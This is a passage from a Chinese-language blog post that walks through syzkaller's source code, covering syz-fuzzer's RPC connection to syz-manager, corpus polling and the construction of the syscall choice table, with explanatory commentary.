&#123;<br>c := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> os.Signal, <span class="hljs-number">3</span>)<br>signal.Notify(c, syscall.SIGINT, syscall.SIGTERM)<br>&lt;-c<br><span class="hljs-built_in">close</span>(shutdown)<br>fmt.Fprint(os.Stderr, <span class="hljs-string">&quot;SIGINT: shutting down...\n&quot;</span>)<br>&lt;-c<br>fmt.Fprint(os.Stderr, <span class="hljs-string">&quot;SIGINT: shutting down harder...\n&quot;</span>)<br>&lt;-c<br>fmt.Fprint(os.Stderr, <span class="hljs-string">&quot;SIGINT: terminating\n&quot;</span>)<br>os.Exit(<span class="hljs-type">int</span>(syscall.SIGINT))<br>&#125;()<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Step-II-与-syz-manager-间建立-RPC-通信，加载语料库"><a href="#Step-II-与-syz-manager-间建立-RPC-通信，加载语料库" class="headerlink" title="Step.II - 与 syz-manager 间建立 RPC 通信，加载语料库"></a>Step.II - 与 syz-manager 间建立 RPC 通信，加载语料库</h3><p>回到 <code>main()</code> 中，接下来会收集 Guest 信息并尝试与 Host（syz-manager） 间建立 RPC 连接，若失败则直接退出，这里我们传给 syz-manager 的是 <code>rpctype.ConnectArgs</code>，收到的响应结果为 <code>rpctype.ConnectRes</code> ，其中包含有很多信息：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs go">checkArgs := &amp;checkArgs&#123;<br>target:         target,<br>sandbox:        sandbox,<br>ipcConfig:      config,<br>ipcExecOpts:    execOpts,<br>gitRevision:    prog.GitRevision,<br>targetRevision: target.Revision,<br>&#125;<br><span class="hljs-keyword">if</span> *flagTest &#123;<br>testImage(*flagManager, checkArgs)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>machineInfo, modules := collectMachineInfos(target)<br><br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;dialing manager at %v&quot;</span>, *flagManager)<br>manager, err := rpctype.NewRPCClient(*flagManager, timeouts.Scale)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to create an RPC client: %v &quot;</span>, err)<br>&#125;<br><br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;connecting to manager...&quot;</span>)<br>a := &amp;rpctype.ConnectArgs&#123;<br>Name:        *flagName,<br>MachineInfo: machineInfo,<br>Modules:     modules,<br>&#125;<br>r := &amp;rpctype.ConnectRes&#123;&#125;<br><span class="hljs-keyword">if</span> err := manager.Call(<span class="hljs-string">&quot;Manager.Connect&quot;</span>, a, r); err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to call Manager.Connect(): %v &quot;</span>, err)<br>&#125;<br></code></pre></td></tr></table></figure><p>syz-fuzzer 中的 RPC 都会调用到 <code>syz-manager/rpc.go</code> 中的 <code>RPCServer</code> 的成员函数，我们最终会调用到 syz-manager 上的 <code>Connect()</code> 函数进行连接，其核心是调用 <code>RPCServer.RPCManagerView.fuzzerConnect()</code> 最小化语料库并拷贝 BugFrame 等信息，这里就不展开分析了：）</p><p>接下来解析要开启的特性标志位；随后检查与 syz-manager 进行 RPC 连接的响应结果中的 <code>CoverFilterBitmap</code> 是否为空，不为空则写入到 <code>&quot;syz-cover-bitmap&quot;</code> 文件中，该信息主要是给 syz-executor 用的：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go">featureFlags, err := csource.ParseFeaturesFlags(<span class="hljs-string">&quot;none&quot;</span>, <span class="hljs-string">&quot;none&quot;</span>, <span class="hljs-literal">true</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatal(err)<br>&#125;<br><span class="hljs-keyword">if</span> r.CoverFilterBitmap != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">if</span> err := osutil.WriteFile(<span class="hljs-string">&quot;syz-cover-bitmap&quot;</span>, r.CoverFilterBitmap); err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to write syz-cover-bitmap: %v&quot;</span>, err)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>之后若 syz-manager 返回结果中的 <code>CheckResult</code> 为空，则重新生成配置信息后通过 RPC 调用 syz-manager 的 <code>Manager.Check()</code> ，若有错误则直接退出：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> r.CheckResult == <span class="hljs-literal">nil</span> &#123;<br>checkArgs.gitRevision = r.GitRevision<br>checkArgs.targetRevision = r.TargetRevision<br>checkArgs.enabledCalls = r.EnabledCalls<br>checkArgs.allSandboxes = r.AllSandboxes<br>checkArgs.featureFlags = featureFlags<br>r.CheckResult, err = checkMachine(checkArgs)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">if</span> r.CheckResult == <span class="hljs-literal">nil</span> &#123;<br>r.CheckResult = <span class="hljs-built_in">new</span>(rpctype.CheckArgs)<br>&#125;<br>r.CheckResult.Error = err.Error()<br>&#125;<br>r.CheckResult.Name = *flagName<br><span class="hljs-keyword">if</span> err := manager.Call(<span class="hljs-string">&quot;Manager.Check&quot;</span>, r.CheckResult, <span class="hljs-literal">nil</span>); err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;Manager.Check call failed: %v&quot;</span>, err)<br>&#125;<br><span class="hljs-keyword">if</span> r.CheckResult.Error != <span class="hljs-string">&quot;&quot;</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;%v&quot;</span>, r.CheckResult.Error)<br>&#125;<br>&#125; <br></code></pre></td></tr></table></figure><p>这次 RPC 实际上会调用到 syz-manager 中的 <code>machineChecked()</code>，该函数会调用 <code>loadCorpus()</code> <strong>完成语料库的加载</strong>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(mgr *Manager)</span></span> machineChecked(a *rpctype.CheckArgs, enabledSyscalls <span class="hljs-keyword">map</span>[*prog.Syscall]<span class="hljs-type">bool</span>) &#123;<br>mgr.mu.Lock()<br><span class="hljs-keyword">defer</span> mgr.mu.Unlock()<br>mgr.checkResult = a<br>mgr.targetEnabledSyscalls = enabledSyscalls<br>mgr.target.UpdateGlobs(a.GlobFiles)<br>mgr.loadCorpus()<br>mgr.firstConnect = time.Now()<br>&#125;<br></code></pre></td></tr></table></figure><p>回到 syz-fuzzer，若 <code>CheckResult</code> 不为空则调用 <code>target.UpdateGlobs()</code> 将 manager 返回数据存放到 <code>GlobFiles</code> 映射中，再调用 <code>Setup()</code> 根据所开启的特性配置 executor 的参数并调用 <code>osutil.RunCmd()</code> 在 5min 后启动 executor，这里就不展开了</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">else</span> &#123;<br>target.UpdateGlobs(r.CheckResult.GlobFiles)<br><span class="hljs-keyword">if</span> err = host.Setup(target, r.CheckResult.Features, featureFlags, config.Executor); err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatal(err)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Step-III-初始化-Fuzzer-结构信息，获取-input-与-candidate"><a href="#Step-III-初始化-Fuzzer-结构信息，获取-input-与-candidate" class="headerlink" title="Step.III - 初始化 Fuzzer 结构信息，获取 input 与 candidate"></a>Step.III - 初始化 Fuzzer 结构信息，获取 input 与 candidate</h3><p>之后日志输出开启的系统调用数量及特性信息，创建 IPC 配置信息，若设置了 <code>runtest</code> 标志位（默认为 false）则调用 <code>runTest()</code> 后直接返回，这个主要是测试用的这里就不展开了：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go">log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;syscalls: %v&quot;</span>, <span class="hljs-built_in">len</span>(r.CheckResult.EnabledCalls[sandbox]))<br><span class="hljs-keyword">for</span> _, feat := <span class="hljs-keyword">range</span> r.CheckResult.Features.Supported() &#123;<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;%v: %v&quot;</span>, feat.Name, feat.Reason)<br>&#125;<br>createIPCConfig(r.CheckResult.Features, config)<br><br><span class="hljs-keyword">if</span> *flagRunTest &#123;<br>runTest(target, manager, *flagName, config.Executor)<br><span class="hljs-keyword">return</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>之后创建 <code>needPoll</code> channel 并写入数据，主要用来标识是否需要向 <code>syz-manager()</code> 发起 poll（向 syz-manager 获取语料库与 candidate）；接下来创建了一个标识当前 <code>syz-fuzzer</code> 信息的 Fuzzer 结构体以及一个 <code>ipc.Gate</code> 结构体（用于将并发级别和窗口限制为给定的值）：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go"><br>needPoll := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;, <span class="hljs-number">1</span>)<br>needPoll &lt;- <span class="hljs-keyword">struct</span>&#123;&#125;&#123;&#125;<br>fuzzer := &amp;Fuzzer&#123;<br>name:                     *flagName,<br>outputType:               outputType,<br>config:                   config,<br>execOpts:                 execOpts,<br>workQueue:                newWorkQueue(*flagProcs, needPoll),<br>needPoll:                 needPoll,<br>manager:                  manager,<br>target:                   target,<br>timeouts:                 timeouts,<br>faultInjectionEnabled:    r.CheckResult.Features[host.FeatureFault].Enabled,<br>comparisonTracingEnabled: r.CheckResult.Features[host.FeatureComparisons].Enabled,<br>corpusHashes:             <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[hash.Sig]<span class="hljs-keyword">struct</span>&#123;&#125;),<br>checkResult:              r.CheckResult,<br>fetchRawCover:            *flagRawCover,<br>noMutate:                 r.NoMutateCalls,<br>stats:                    <span class="hljs-built_in">make</span>([]<span class="hljs-type">uint64</span>, StatCount),<br>&#125;<br>gateCallback := fuzzer.useBugFrames(r, *flagProcs)<br>fuzzer.gate = ipc.NewGate(<span class="hljs-number">2</span>**flagProcs, gateCallback)<br><br></code></pre></td></tr></table></figure><p>接下来是一个小循环，调用 <code>poll()</code> 以<strong>向 syz-manager 获取语料库与 candidate 加入到本地工作队列中</strong>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> needCandidates, more := <span class="hljs-literal">true</span>, <span class="hljs-literal">true</span>; more; needCandidates = <span class="hljs-literal">false</span> &#123;<br>more = fuzzer.poll(needCandidates, <span class="hljs-literal">nil</span>)<br><span class="hljs-comment">// 该循环在 qemu 模拟中为 &quot;no output&quot; , 以告诉 manager 我们还没死.</span><br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;fetching corpus: %v, signal %v/%v (executing program)&quot;</span>,<br><span class="hljs-built_in">len</span>(fuzzer.corpus), <span class="hljs-built_in">len</span>(fuzzer.corpusSignal), <span class="hljs-built_in">len</span>(fuzzer.maxSignal))<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="poll-：通过-RPC-向-syz-manager-获取语料库与-candidate-加入本地工作队列中"><a href="#poll-：通过-RPC-向-syz-manager-获取语料库与-candidate-加入本地工作队列中" class="headerlink" title="poll()：通过 RPC 向 syz-manager 获取语料库与 candidate 加入本地工作队列中"></a>poll()：通过 RPC 向 syz-manager 获取语料库与 candidate 加入本地工作队列中</h4><p>该函数主要做了两件事：</p><ul><li>通过 RPC 向 syz-manager 获取语料库与 candidate</li><li>将获得的 candidate 加入本地工作队列中</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(fuzzer *Fuzzer)</span></span> poll(needCandidates <span class="hljs-type">bool</span>, stats <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">uint64</span>) <span class="hljs-type">bool</span> &#123;<br>a := &amp;rpctype.PollArgs&#123;<br>Name:           fuzzer.name,<br>NeedCandidates: needCandidates,<br>MaxSignal:      fuzzer.grabNewSignal().Serialize(),<br>Stats:          stats,<br>&#125;<br>r := &amp;rpctype.PollRes&#123;&#125;<br>    <span class="hljs-comment">/* RPC 向 syz-manager 请求信息 */</span> <br><span class="hljs-keyword">if</span> err := fuzzer.manager.Call(<span class="hljs-string">&quot;Manager.Poll&quot;</span>, a, r); err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;Manager.Poll call failed: %v&quot;</span>, err)<br>&#125;<br>    <span class="hljs-comment">/* 解析：最大信号数量 */</span><br>maxSignal := r.MaxSignal.Deserialize()<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;poll: candidates=%v inputs=%v signal=%v&quot;</span>,<br><span class="hljs-built_in">len</span>(r.Candidates), <span class="hljs-built_in">len</span>(r.NewInputs), maxSignal.Len())<br>fuzzer.addMaxSignal(maxSignal)<br>    <span class="hljs-comment">/* 解析：syz-manager 给予的从其他 fuzzer 获得的新输入 */</span><br><span class="hljs-keyword">for</span> _, inp := <span class="hljs-keyword">range</span> r.NewInputs &#123;<br>fuzzer.addInputFromAnotherFuzzer(inp)<br>&#125;<br>    <span class="hljs-comment">/* 解析：candidate */</span><br><span class="hljs-keyword">for</span> _, candidate := <span class="hljs-keyword">range</span> r.Candidates &#123;<br>fuzzer.addCandidateInput(candidate)<br>&#125;<br><span class="hljs-keyword">if</span> needCandidates &amp;&amp; <span class="hljs-built_in">len</span>(r.Candidates) == <span class="hljs-number">0</span> &amp;&amp; atomic.LoadUint32(&amp;fuzzer.triagedCandidates) == <span class="hljs-number">0</span> &#123;<br>atomic.StoreUint32(&amp;fuzzer.triagedCandidates, <span class="hljs-number">1</span>)<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">len</span>(r.NewInputs) != <span class="hljs-number">0</span> || <span class="hljs-built_in">len</span>(r.Candidates) != <span class="hljs-number">0</span> || maxSignal.Len() != <span class="hljs-number">0</span><br>&#125;<br></code></pre></td></tr></table></figure><p>该函数会通过 RPC 调用到 syz-manager 中 <code>syz-manager/rpc.go</code> 下的 <code>Poll()</code> 函数：</p><ul><li>首先会获取在 syz-manager 中该 syz-fuzzer 的信息，并检查最大信号量</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(serv *RPCServer)</span></span> Poll(a *rpctype.PollArgs, r *rpctype.PollRes) <span class="hljs-type">error</span> &#123;<br>serv.stats.mergeNamed(a.Stats)<br><br>serv.mu.Lock()<br><span class="hljs-keyword">defer</span> serv.mu.Unlock()<br><br>f := serv.fuzzers[a.Name]<br><span class="hljs-keyword">if</span> f == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-comment">// 若我们调用了 shutdownInstance 、但已经有一个来自该实例的待处理请求，则这是有可能的</span><br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;poll: fuzzer %v is not connected&quot;</span>, a.Name)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br>newMaxSignal := serv.maxSignal.Diff(a.MaxSignal.Deserialize())<br><span class="hljs-keyword">if</span> !newMaxSignal.Empty() &#123;<br>serv.maxSignal.Merge(newMaxSignal)<br>serv.stats.maxSignal.set(<span class="hljs-built_in">len</span>(serv.maxSignal))<br><span class="hljs-keyword">for</span> _, f1 := <span class="hljs-keyword">range</span> serv.fuzzers &#123;<br><span class="hljs-keyword">if</span> f1 == f || f1.rotated &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br>f1.newMaxSignal.Merge(newMaxSignal)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>如果该 syz-fuzzer 对应的 VM 实例正在轮转运行，则直接返回</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> f.rotated &#123;<br><span class="hljs-comment">// 让轮转中的 VMs 独立运行，不要向他们发送任何东西</span><br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>接下来写入新的最大信号，之后检查 syz-fuzzer 是否向 syz-manager 请求了新的 candidate，若是则调用 <code>candidateBatch()</code> 获取，该函数的作用主要是从 syz-manager 上的 candidate 队列中获取一定数量的 candidate</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go">r.MaxSignal = f.newMaxSignal.Split(<span class="hljs-number">2000</span>).Serialize()<br><span class="hljs-keyword">if</span> a.NeedCandidates &#123;<br>r.Candidates = serv.mgr.candidateBatch(serv.batchSize)<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>若获取到的 candidate 数量为 0，说明是第一次 <code>poll()</code>，这时便从初始化时所读取的语料库中获取输入作为 candidate 返还给 syz-fuzzer</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(r.Candidates) == <span class="hljs-number">0</span> &#123;<br>batchSize := serv.batchSize<br><span class="hljs-comment">// 当 fuzzer 启动时, 其会抽取所有的语料库.</span><br><span class="hljs-comment">// 若我们使用最后的 batchSize 进行操作, 这将会非常慢</span><br><span class="hljs-comment">// (对于 50k 的语料库与慢内核而言，一批大小为 6 可能需要10min以上的时间).</span><br><span class="hljs-comment">// 所以在最初就使用更大的批量 (we use no stats as approximation of initial pump).</span><br><span class="hljs-keyword">const</span> initialBatch = <span class="hljs-number">50</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(a.Stats) == <span class="hljs-number">0</span> &amp;&amp; batchSize &lt; initialBatch &#123;<br>batchSize = initialBatch<br>&#125;<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; batchSize &amp;&amp; <span class="hljs-built_in">len</span>(f.inputs) &gt; <span class="hljs-number">0</span>; i++ &#123;<br>last := <span class="hljs-built_in">len</span>(f.inputs) - <span class="hljs-number">1</span><br>r.NewInputs = <span class="hljs-built_in">append</span>(r.NewInputs, f.inputs[last])<br>f.inputs[last] = rpctype.Input&#123;&#125;<br>f.inputs = f.inputs[:last]<br>&#125;<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(f.inputs) == <span class="hljs-number">0</span> &#123;<br>f.inputs = <span class="hljs-literal">nil</span><br>&#125;<br>&#125;<br>log.Logf(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;poll from %v: candidates=%v inputs=%v maxsignal=%v&quot;</span>,<br>a.Name, <span class="hljs-built_in">len</span>(r.Candidates), <span class="hljs-built_in">len</span>(r.NewInputs), <span class="hljs-built_in">len</span>(r.MaxSignal.Elems))<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="构建【系统调用生成优先级表】"><a href="#构建【系统调用生成优先级表】" class="headerlink" title="构建【系统调用生成优先级表】"></a>构建【系统调用生成优先级表】</h2><p>接下来是正式进行 fuzzing 之前最核心的一步——构建<strong>【系统调用生成优先级表】</strong> <code>choiceTable</code> ，该表的作用是：</p><ul><li><strong>计算对于给定的系统调用 x，在添加入系统调用 y 后，代码覆盖率会上升的可能性</strong></li></ul><p>从而<strong>在后续的 fuzzing 过程当中使用该表对输入进行变异</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go">calls := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[*prog.Syscall]<span class="hljs-type">bool</span>)<br><span class="hljs-keyword">for</span> _, id := <span class="hljs-keyword">range</span> r.CheckResult.EnabledCalls[sandbox] &#123;<br>calls[target.Syscalls[id]] = <span class="hljs-literal">true</span><br>&#125;<br>fuzzer.choiceTable = target.BuildChoiceTable(fuzzer.corpus, calls)<br></code></pre></td></tr></table></figure><p><code>choiceTable</code> 的计算通过 定义于<code>prog/prio.go</code> 中的 <code>BuildChoiceTable()</code> 完成：</p><ul><li>首先建立两个表：<ul><li>① <code>Syscall→bool</code> 的表 <code>enable</code>，表示<strong>启用的系统调用</strong>，并将所有系统调用都初始化为 <code>true</code> </li><li>② <code>int→bool</code> 的表 <code>noGenerateCalls</code> ，表示<strong>不用于生成的系统调用</strong></li></ul></li><li>接下来遍历系统调用属性（在 syzlang 规则文件中编写），若某个系统调用不开启则将其从 <code>enable</code> 表中去除，若某个系统调用不用于生成则将其从 <code>enable</code> 表中去除并添加到 <code>noGenerateCalls</code> 表</li><li>之后创建第三个表 <code>generateCalls</code>，为 <code>enable</code> 表的拷贝，表示<strong>用于生成的系统调用</strong>，并根据系统调用号进行从小到大的排序</li></ul><blockquote><p>这里的【生成】指的是生成新的输入，即我们是否在输入生成时添加该系统调用</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(target *Target)</span></span> BuildChoiceTable(corpus []*Prog, enabled <span class="hljs-keyword">map</span>[*Syscall]<span class="hljs-type">bool</span>) *ChoiceTable &#123;<br><span class="hljs-keyword">if</span> enabled == <span class="hljs-literal">nil</span> &#123;<br>enabled = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[*Syscall]<span class="hljs-type">bool</span>)<br><span class="hljs-keyword">for</span> _, c := <span class="hljs-keyword">range</span> target.Syscalls &#123;<br>enabled[c] = <span class="hljs-literal">true</span><br>&#125;<br>&#125;<br>noGenerateCalls := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]<span class="hljs-type">bool</span>)<br><span class="hljs-keyword">for</span> call := <span class="hljs-keyword">range</span> enabled &#123;<br><span class="hljs-keyword">if</span> call.Attrs.Disabled &#123;<br><span class="hljs-built_in">delete</span>(enabled, call)<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> call.Attrs.NoGenerate &#123;<br>noGenerateCalls[call.ID] = <span class="hljs-literal">true</span><br><span class="hljs-built_in">delete</span>(enabled, call)<br>&#125;<br>&#125;<br>    <span class="hljs-keyword">var</span> generatableCalls []*Syscall<br><span class="hljs-keyword">for</span> c := <span class="hljs-keyword">range</span> enabled &#123;<br>generatableCalls = <span class="hljs-built_in">append</span>(generatableCalls, c)<br>&#125;<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(generatableCalls) == <span class="hljs-number">0</span> &#123;<br><span class="hljs-built_in">panic</span>(<span class="hljs-string">&quot;no syscalls enabled and generatable&quot;</span>)<br>&#125;<br>sort.Slice(generatableCalls, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(i, j <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">bool</span> &#123;<br><span class="hljs-keyword">return</span> generatableCalls[i].ID &lt; generatableCalls[j].ID<br>&#125;)<br></code></pre></td></tr></table></figure><ul><li>接下来判断语料库中是否包含有禁用的系统调用，若是则直接退出</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> _, p := <span class="hljs-keyword">range</span> corpus &#123;<br><span class="hljs-keyword">for</span> _, call := <span class="hljs-keyword">range</span> p.Calls &#123;<br><span class="hljs-keyword">if</span> !enabled[call.Meta] &amp;&amp; !noGenerateCalls[call.Meta.ID] &#123;<br>fmt.Printf(<span class="hljs-string">&quot;corpus contains disabled syscall %v\n&quot;</span>, call.Meta.Name)<br><span class="hljs-built_in">panic</span>(<span class="hljs-string">&quot;disabled syscall&quot;</span>)<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>最后调用 <code>target.CalculatePriorities(corpus)</code> <strong>基于语料库进行系统调用生成优先级表的计算</strong></li><li>完成后生成一个新的表 <code>run</code> 作为结果与生成&amp;不生成系统调用表一起返回，其中存储的是对于启用的系统调用而言的<strong>加权权重的累加和</strong></li></ul><blockquote><p>例如有给定的三个系统调用 A、B、C，有这样的一个生成优先级表 <code>prios</code>：</p><figure class="highlight 